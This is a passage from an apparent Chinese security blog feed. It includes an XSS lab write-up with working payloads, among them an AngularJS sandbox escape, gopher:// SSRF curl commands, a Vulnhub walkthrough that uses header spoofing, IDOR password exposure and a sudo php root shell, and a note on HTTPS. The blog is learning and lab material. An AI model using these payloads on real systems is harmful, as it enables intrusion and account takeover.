class="token keyword">var</span> username <span class="token operator">=</span> <span class="token string">'&lt;script>alert()&lt;/script>'</span><span class="token punctuation">;</span>    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'ccc'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML<span class="token operator">=</span> <span class="token string">"Welcome "</span> <span class="token operator">+</span> username<span class="token punctuation">;</span>    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>payload被包裹，尝试闭合：<code>var username = &#39;\&#39;;alert();&#39;;</code></p><p>单引号被转义，尝试两个单引号：<code>&#39;&#39;;alert();//</code></p><p>闭合成功：<code>var username = &#39;\&#39;&#39;;alert();//&#39;;</code></p><h4 id="还有另外一种方法"><a href="#还有另外一种方法" class="headerlink" title="还有另外一种方法"></a>还有另外一种方法</h4><p>写入<code>&lt;img&gt;</code>标签，<code>alert()</code>用onclick等以<strong>on</strong>开头的事件表示。</p><p>payload：<code>&lt;img src=1 onclick=alert();&gt;</code></p><p><code>on</code>事件概览：</p><p><img src="https://gitee.com/zku4n/picgo/raw/master/img/incident.jpeg"></p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>查看源代码：</p><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>    <span class="token keyword">var</span> time <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> jumpUrl<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token string">'jumpUrl'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    jumpUrl <span class="token operator">=</span> location<span class="token punctuation">.</span>href<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    jumpUrl <span class="token operator">=</span> <span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token string">'jumpUrl'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span>jump<span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">,</span>time<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">jump</span><span class="token punctuation">(</span><span class="token parameter">time</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>time <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    location<span class="token punctuation">.</span>href <span class="token operator">=</span> jumpUrl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    time <span class="token operator">=</span> time <span class="token operator">-</span> <span class="token number">1</span> <span class="token punctuation">;</span>    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'ccc'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML<span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">页面</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>time<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">秒后将会重定向到</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">escape</span><span class="token punctuation">(</span>jumpUrl<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span>jump<span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">,</span>time<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token parameter">variable</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token keyword">var</span> query <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">var</span> vars <span class="token operator">=</span> query<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>vars<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token keyword">var</span> pair <span class="token operator">=</span> vars<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">if</span><span class="token punctuation">(</span>pair<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> variable<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> pair<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>       <span class="token punctuation">&#125;</span>       <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>XSS 伪链接</p><p><code>javascript:alert(/xss/)</code>并不会定向到其他页面，而是在当前页面执行<code>alert(/xss/)</code>。</p><h3 id="windows-location属性"><a href="#windows-location属性" class="headerlink" title="windows.location属性"></a><strong>windows.location</strong>属性</h3><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>hash</td><td>设置或返回从#开始的URL（锚）</td></tr><tr><td>host</td><td>设置或返回主机名和当前URL的端口号</td></tr><tr><td>hostname</td><td>设置或返回当前URL的主机名</td></tr><tr><td>href</td><td>设置或返回完整的URL</td></tr><tr><td>pathname</td><td>设置或返回当前URL的路径部分</td></tr><tr><td>port</td><td>设置或返回当前URL的端口号</td></tr><tr><td>protocol</td><td>设置或返回当前URL的协议</td></tr><tr><td>search</td><td>设置或返回从?开始的URL（查询部分）</td></tr></tbody></table><p><code>function getQueryVariable()</code>中的<code>window.location.search.substring(1);</code>表示了返回从<code>?</code>开始的URL</p><p><code>jumpUrl</code>为注入点，构造payload：<code>http://127.0.0.1:3000/level3?jumpUrl=javascript:alert();</code></p><p>注入成功。</p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>审计代码：</p><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token string">'autosubmit'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> autoForm <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'autoForm'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    autoForm<span class="token punctuation">.</span>action <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token string">'action'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token operator">?</span> location<span class="token punctuation">.</span>href <span class="token operator">:</span> <span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token string">'action'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    autoForm<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token parameter">variable</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token keyword">var</span> query <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">var</span> vars <span class="token operator">=</span> query<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>vars<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token keyword">var</span> pair <span class="token operator">=</span> vars<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">if</span><span class="token punctuation">(</span>pair<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> variable<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> pair<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>       <span class="token punctuation">&#125;</span>       <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p><code>getQueryVariable(&#39;autosubmit&#39;) !== false</code>其中<code>autosubmit</code>不能为false，需要传入值使其为true；<code>getQueryVariable(&#39;action&#39;) == false</code>其中<code>action</code>不能为false。参数之间用<code>&amp;</code>连接。</p><p>构造payload：<code>?autosubmit=1&amp;action=javascript:alert(/xss/)</code></p><p>注入成功。</p><h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><p><strong>涉及到模板注入AngularJS沙箱逃逸</strong>。</p><p>常规插入payload<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>及各种绕过方式都无法注入</p><p>查看网页源代码</p><p><code>&lt;script src=&quot;https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js&quot;&gt;&lt;/script&gt;</code></p><p>引用了AngularJS框架。</p><p>尝试<code>username=&#123;&#123;2*2&#125;&#125;</code></p><p>得到返回值<strong>4</strong>，花括号中的表达式被执行了，意味着服务器允许用户在花括号中传入命令参数，可以实现模板注入攻击。</p><p>根据Wappalyzer判断，AngularJS版本为<code>1.4.6</code></p><p><img src="https://gitee.com/zku4n/picgo/raw/master/img/xssJS.png"></p><p>AngularJS 1.6 版本之前有Angular沙箱，利用沙箱逃逸技术进行XSS攻击。</p><p><strong>AngularJS沙箱逃逸：</strong></p><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">'a'</span><span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>charAt<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>join<span class="token punctuation">;</span>  <span class="token comment">//'a'.构造函数.原型.charAt</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'x=1&#125;&#125;&#125;;alert(1)//'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div><p>通过覆盖原生函数charAt，可以绕过Angular表达式的沙箱且执行<code>alert(1)</code></p><p>因此构造payload：</p><p><code>?username=&#123;&#123;'a'.constructor.prototype.charAt=[].join;$eval('x=1&#125; &#125; &#125;;alert(1)//');&#125;&#125;</code></p><p>注入成功。</p><p>关于AngularJS沙箱逃逸的技术分析：</p><p><a href="https://github.com/rwinch/angularjs-escaping-expression-sandbox">https://github.com/rwinch/angularjs-escaping-expression-sandbox</a></p><p><a href="https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs">https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs</a></p><p><a href="https://xz.aliyun.com/t/4638">https://xz.aliyun.com/t/4638</a></p>]]></content>
    
    
    <summary type="html">XSS学习</summary>
    
    
    
    <category term="WebSec" scheme="https://whoiszkuan.github.io/categories/WebSec/"/>
    
    
    <category term="Security" scheme="https://whoiszkuan.github.io/tags/Security/"/>
    
    <category term="Web" scheme="https://whoiszkuan.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>SSRF-Gopher</title>
    <link href="https://whoiszkuan.github.io/2021/10/31/SSRF-Gopher/"/>
    <id>https://whoiszkuan.github.io/2021/10/31/SSRF-Gopher/</id>
    <published>2021-10-31T06:37:46.000Z</published>
    <updated>2022-01-24T05:31:55.321Z</updated>
    
    <content type="html"><![CDATA[<h1 id="What-is-Gopher"><a href="#What-is-Gopher" class="headerlink" title="What is Gopher?"></a>What is Gopher?</h1><h2 id="初识Gopher"><a href="#初识Gopher" class="headerlink" title="初识Gopher"></a>初识Gopher</h2><p>​    在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用<strong>tcp70端口</strong>。</p><p>​    Gopher协议支持发出GET和POST请求：可以先截获GET请求包和POST请求包，再构成符合Gopher协议的请求。Gopher协议是SSRF利用中最强大的协议。</p><p><strong>限制</strong>：</p><table><thead><tr><th align="center">协议</th><th align="center">PHP</th><th align="center">Java</th><th align="center">Curl</th><th align="center">Perl</th><th align="center">ASP.NET</th></tr></thead><tbody><tr><td align="center">Gopher</td><td align="center">–wite-curlwrappers且php版本至少为5.3</td><td align="center">小于JDK1.7</td><td align="center">低版本不支持</td><td align="center">支持</td><td align="center">小于版本3</td></tr></tbody></table><blockquote><p>–wite-curlwrappers:运用curl工具打开url流</p><p>curl使用curl –version查看版本以及支持的协议</p></blockquote><p>Gopher协议格式</p><p><code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</code></p><ul><li>Gopher默认端口是70</li><li>如果发起POST请求，回车换行需要使用<code>%0d%0a</code>，如果多个参数，参数之间的&amp;也需要进行URL编码</li></ul><hr><h2 id="Gopher-HTTP"><a href="#Gopher-HTTP" class="headerlink" title="Gopher HTTP"></a>Gopher HTTP</h2><p>Gopher发送HTTP数据步骤：</p><ol><li>构造HTTP数据包</li><li>URL编码、替换回车换行为<code>%0d%0a</code></li><li>发送Gopher协议</li></ol><h3 id="GET型HTTP"><a href="#GET型HTTP" class="headerlink" title="GET型HTTP"></a>GET型HTTP</h3><div class="code-wrapper"><pre class="line-numbers language-http" data-language="http"><code class="language-http">GET &#x2F;ssrf&#x2F;base&#x2F;get.php?name&#x3D;zkuan HTTP&#x2F;1.1Host:192.168.1.111<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><p>URL编码后使用curl发送HTTP包：</p><div class="code-wrapper"><pre class="line-numbers language-http" data-language="http"><code class="language-http">curl gopher:&#x2F;&#x2F;192.168.1.122&#x2F;_GET%20&#x2F;ssrf&#x2F;base&#x2F;get.php%3fname&#x3D;zkuan%20HTTP&#x2F;1.1%0d%0aHost:192.168.1.111%0d%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><h3 id="POST型HTTP"><a href="#POST型HTTP" class="headerlink" title="POST型HTTP"></a>POST型HTTP</h3><div class="code-wrapper"><pre class="line-numbers language-http" data-language="http"><code class="language-http">POST &#x2F;ssrf&#x2F;base&#x2F;post.php HTTP&#x2F;1.1Host:192.168.1.111Content-Type:application&#x2F;x-www-form-urlencodedContent-Length:11name&#x3D;zkuan<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>URL编码后使用curl发送HTTP包：</p><div class="code-wrapper"><pre class="line-numbers language-http" data-language="http"><code class="language-http">curl gopher:&#x2F;&#x2F;192.168.1.122&#x2F;_POST%20&#x2F;ssrf&#x2F;base&#x2F;post.php%20HTTP&#x2F;1.1%0d%0aHost:192.168.1.111%0d%0aContent-Type:application&#x2F;x-www-form-urlencoded%0d%0aContent-Length:11%0d%0a%0d%0aname&#x3D;zkuan%0d%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div>]]></content>
    
    
    <summary type="html">SSRF Gopher 浅析</summary>
    
    
    
    <category term="WebSec" scheme="https://whoiszkuan.github.io/categories/WebSec/"/>
    
    
    <category term="Security" scheme="https://whoiszkuan.github.io/tags/Security/"/>
    
    <category term="Web" scheme="https://whoiszkuan.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub Me And My Girlfriend</title>
    <link href="https://whoiszkuan.github.io/2021/10/01/Vulnhub-Me-And-My-Girlfriend/"/>
    <id>https://whoiszkuan.github.io/2021/10/01/Vulnhub-Me-And-My-Girlfriend/</id>
    <published>2021-10-01T06:07:54.000Z</published>
    <updated>2022-01-24T05:31:51.213Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Me-And-My-Girlfriend-1"><a href="#Me-And-My-Girlfriend-1" class="headerlink" title="Me And My Girlfriend:1"></a>Me And My Girlfriend:1</h1><p>渗透准备：</p><ol><li>主机：Kali 2021.2</li><li>靶机：Vmware </li><li>靶机IP段：192.168.158.*</li><li>Http信息头知识</li><li>Linux操作基础</li></ol><h2 id="靶机背景"><a href="#靶机背景" class="headerlink" title="靶机背景"></a>靶机背景</h2><p>难易度：简单</p><p>靶机镜下载地址:<a href="https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/">https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/</a></p><p>背景：This VM tells us that there are a couple of lovers namely Alice and Bob, where the couple was originally very romantic, but since Alice worked at a private company, “Ceban Corp”, something has changed from Alice’s attitude towards Bob like something is “hidden”, And Bob asks for your help to get what Alice is hiding and get full access to the company!</p><p>大致意思就是男主Bob怀疑女主Alice出轨了，让我们潜入Alice公司内部查看Alice的电脑线索。</p><h2 id="开启靶机，扫描目标主机IP段"><a href="#开启靶机，扫描目标主机IP段" class="headerlink" title="开启靶机，扫描目标主机IP段"></a>开启靶机，扫描目标主机IP段</h2><p><code>nmap -sP 192.168.158.0/24</code></p><p>检测出靶机IP为<code>192.168.158.128</code></p><p><img src="/images/mamg1.png"></p><h2 id="扫描靶机信息"><a href="#扫描靶机信息" class="headerlink" title="扫描靶机信息"></a>扫描靶机信息</h2><p>nmap基础用法：<code>-A 版本检测 -O 检测OS版本 -sV 服务探测/版本信息</code></p><p><code>nmap -A -O -sV 192.168.158.128</code></p><p><img src="/images/mamg2.png"></p><p>得出靶机开放了<code>ssh:22</code>和<code>http:80</code>服务</p><h2 id="访问80端口"><a href="#访问80端口" class="headerlink" title="访问80端口"></a>访问80端口</h2><p>访问80端口发现无法正常进入网页</p><p><img src="/images/mamg3.png"></p><p>翻译过来意思是：只能通过本地IP访问</p><p>打开网页源代码看看有没有什么提示：</p><p><img src="/images/mamg4.png"></p><p>提示使用<strong>X-FORWARDED-FOR</strong>访问网页</p><p><code>X-Forwarded-For用来获取最初发起请求的IP</code></p><p>综上所述：我们需要使用X-Forwarded-For伪造一个本地IP为最初发起请求访问靶机80端口</p><h2 id="X-Forwarded-FOR"><a href="#X-Forwarded-FOR" class="headerlink" title="X-Forwarded-FOR"></a>X-Forwarded-FOR</h2><p>已知本地IP地址为<strong>127.0.0.1</strong></p><p>使用X-Forwarded-For Header伪造IP</p><p><img src="/images/xfw.png"></p><p>成功登录</p><p><img src="/images/mamg5.png"></p><p>页面有4个选项，分别为 主页、登录、注册、关于。</p><p>先随便注册一个帐号登录</p><p><img src="/images/mamg6.png"></p><h2 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h2><p>登录进去之后对我们最有用的是Profile选项</p><p>这是一个更改密码的选项</p><p>在网址栏上发现了一点端倪</p><p><code>?</code>后面跟随的是参数<code>page=profile&amp;user_id=12</code>，请求了<code>profile</code>页面，用户id为<code>12</code></p><p>尝试修改Id</p><p><img src="/images/mamg7.png"></p><p>可以看到回显出了其他用户的帐号和密码</p><p>如果获得了帐号和密码就可以尝试登录22端口的ssh服务</p><p>那么密码该如何获得</p><p><code>html中设置输入文本隐藏明文的操作为type=&quot;password&quot;,在审查代码中修改type类型为type=&quot;text&quot;,可查看用户输入的密码。</code></p><p><img src="/images/mamg8.png"></p><p><img src="/images/mamg9.png"></p><p>得出用户密码。</p><p>遍历所有用户id后锁定Bob女友Alice的账户密码为<code>alice:4lic3</code></p><h2 id="SSH访问"><a href="#SSH访问" class="headerlink" title="SSH访问"></a>SSH访问</h2><p>得到Alice的账户和密码后，使用ssh访问靶机电脑</p><p><code>ssh alice@192.168.158.128</code></p><p><img src="/images/mamg10.png"></p><h2 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag 1"></a>Flag 1</h2><p>列出当前文件夹所有文件，包括隐藏文件</p><p><img src="/images/mamg11.png"></p><p>发现文件夹下有一个隐藏文件夹</p><p><img src="/images/mamg12.png"></p><p><img src="/images/mamg13.png"></p><p>进入后发现有<code>flag1.txt</code>文件</p><p>成功获取flag1</p><p><code>Flag 1 : gfriEND&#123;2f5f21b2af1b8c3e227bcf35544f8f09&#125;</code></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>尝试<code>sudo su</code>无法提权</p><p>查看Alice当前权限</p><p><img src="/images/mamg14.png"></p><p><code>(root)NOPASSWD:/usr/bin/php</code>发现可以不使用密码打开php文件</p><p><a href="https://gtfobins.github.io/">基础提权</a></p><p>尝试回调php提权</p><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">CMD&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;sudo php -r &quot;system(&#39;$CMD&#39;);&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><p><img src="/images/mamg15.png"></p><p>成功回调root</p><h2 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag 2"></a>Flag 2</h2><p>查找flag文件</p><p><img src="/images/mamg16.png"></p><p>进入<code>/root</code>文件夹以后，发现<code>flag2.txt</code>文件</p><p><img src="/images/mamg17.png"></p><p>成功拿下flag2</p><blockquote><p> Flag 2: gfriEND{56fbeef560930e77ff984b644fde66e7}</p></blockquote>]]></content>
    
    
    <summary type="html">渗透测试初探，简单渗透测试流程学习及思路。</summary>
    
    
    
    <category term="Exploit" scheme="https://whoiszkuan.github.io/categories/Exploit/"/>
    
    
    <category term="Security" scheme="https://whoiszkuan.github.io/tags/Security/"/>
    
    <category term="Penetration Testing" scheme="https://whoiszkuan.github.io/tags/Penetration-Testing/"/>
    
  </entry>
  
  <entry>
    <title>Http Agreement</title>
    <link href="https://whoiszkuan.github.io/2021/09/10/Http%20Agreement/"/>
    <id>https://whoiszkuan.github.io/2021/09/10/Http%20Agreement/</id>
    <published>2021-09-10T11:39:28.000Z</published>
    <updated>2022-01-24T05:32:07.692Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>服务器和客户端进行数据交互的一种形式。</p><h2 id="常用请求头信息"><a href="#常用请求头信息" class="headerlink" title="常用请求头信息"></a>常用请求头信息</h2><ul><li>User-Agent：请求载体的身份标识。</li><li>Connection：请求完毕后，是断开连接还是保持连接。</li></ul><h2 id="常用响应头信息"><a href="#常用响应头信息" class="headerlink" title="常用响应头信息"></a>常用响应头信息</h2><ul><li>Content-Type：服务器响应回客户端的数据类型。</li></ul><h2 id="https协议-Hyper-Text-Transfer-Protocol"><a href="#https协议-Hyper-Text-Transfer-Protocol" class="headerlink" title="https协议(Hyper Text Transfer Protocol)"></a>https协议(Hyper Text Transfer Protocol)</h2><ul><li>安全的超文本传输协议</li></ul><h2 id="加密方式"><a href="#加密方式" class="headerlink" title="加密方式"></a>加密方式</h2><ul><li>对称密钥加密</li><li>非对称密钥加密</li><li>证书密钥加密(https)</li></ul><h3 id="对称密钥加密"><a href="#对称密钥加密" class="headerlink" title="对称密钥加密"></a>对称密钥加密</h3><ul><li><p>客户端向服务器发送一条信息，首先客户端会采用已知的算法对信息进行加密，比如MD5或者Base64加密，接收端对加密的信息进行解密的时候需要用到密钥，中间会传递密钥，（加密和解密的密钥是同一个），密钥在传输中间是被加密。</p><p><strong>有潜在的危险，一旦被窃听，或者信息被挟持，就有可能破解密钥，而破解其中的信息。因此“共享密钥加密”这种方式存在安全隐患。</strong></p></li></ul><p><img src="/images/https-key1.png"></p><h3 id="非对称密钥加密"><a href="#非对称密钥加密" class="headerlink" title="非对称密钥加密"></a>非对称密钥加密</h3><ul><li><p>“非对称加密”使用的时候有两把锁，一把叫做“私有密钥”，一把是“公开密钥”，使用非对象加密的加密方式的时候，服务器首先告诉客户端按照自己给定的公开密钥进行加密处理，客户端按照公开密钥加密以后，服务器接受到信息再通过自己的私有密钥进行解密。</p><p><strong>这样做的好处就是解密的钥匙根本就不会进行传输，因此也就避免了被挟持的风险。就算公开密钥被窃听者拿到了，它也很难进行解密，因为解密过程是对离散对数求值，这可不是轻而易举就能做到的事。</strong></p><p><strong>缺点：</strong></p><ul><li>如何保证接收端向发送端发出公开秘钥的时候，发送端确保收到的是预先要发送的，而不会被挟持。只要是发送密钥，就有可能有被挟持的风险。</li><li>非对称加密的方式效率比较低，它处理起来更为复杂，通信过程中使用就有一定的效率问题而影响通信速度</li></ul><p><img src="/images/https-key2.png"></p></li></ul><h3 id="证书密钥加密"><a href="#证书密钥加密" class="headerlink" title="证书密钥加密"></a>证书密钥加密</h3><p>数字证书认证机构是客户端与服务器都可信赖的第三方机构。</p><p>传播过程：</p><ul><li>服务器的开发者携带公开密钥，向数字证书认证机构提出公开密钥的申请，数字证书认证机构在认清申请者的身份，审核通过以后，会对开发者申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将密钥放在证书里面，绑定在一起</li><li>服务器将这份数字证书发送给客户端，因为客户端也认可证书机构，客户端可以通过数字证书中的数字签名来验证公钥的真伪，来确保服务器传过来的公开密钥是真实的。一般情况下，证书的数字签名是很难被伪造的，这取决于认证机构的公信力。一旦确认信息无误之后，客户端就会通过公钥对报文进行加密发送，服务器接收到以后用自己的私钥进行解密。</li></ul><p><img src="/images/https-key3.png"></p>]]></content>
    
    
    <summary type="html">HTTP协议学习。</summary>
    
    
    
    <category term="WebSec" scheme="https://whoiszkuan.github.io/categories/WebSec/"/>
    
    
    <category term="Security" scheme="https://whoiszkuan.github.io/tags/Security/"/>
    
    <category term="Web" scheme="https://whoiszkuan.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>gTile Linux split screen</title>
    <link href="https://whoiszkuan.github.io/2021/08/14/gTile%20Linux%20split%20screen/"/>
    <id>https://whoiszkuan.github.io/2021/08/14/gTile%20Linux%20split%20screen/</id>
    <published>2021-08-14T07:26:29.000Z</published>
    <updated>2022-01-24T05:32:10.992Z</updated>
    
